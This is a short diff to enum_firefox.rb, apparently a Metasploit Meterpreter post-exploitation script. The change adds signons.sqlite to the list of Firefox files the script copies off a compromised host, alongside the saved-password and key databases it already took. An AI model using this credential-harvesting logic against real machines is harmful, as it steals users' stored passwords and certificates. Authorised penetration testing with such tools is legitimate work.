@@ -1,5 +1,5 @@
 #
-# $Id$
+# $Id: enum_firefox.rb 9770 2010-07-10 20:00:32Z darkoperator $
 # $Revision$
 # Author: Carlos Perez at carlos_perez[at]darkoperator.com
 #-------------------------------------------------------------------------------
@@ -187,7 +187,7 @@ def frfxpswd(path,usrnm)
 
 		if @client.fs.file.stat(fullpath).directory?
 			frfxpswd(fullpath,usrnm)
-		elsif fullpath =~ /(cert8.db|signons3.txt|key3.db)/i
+		elsif fullpath =~ /(cert8.db|signons.sqlite|signons3.txt|key3.db)/i
 			begin
 				dst = x
 				dst = @logs + ::File::Separator + usrnm + dst
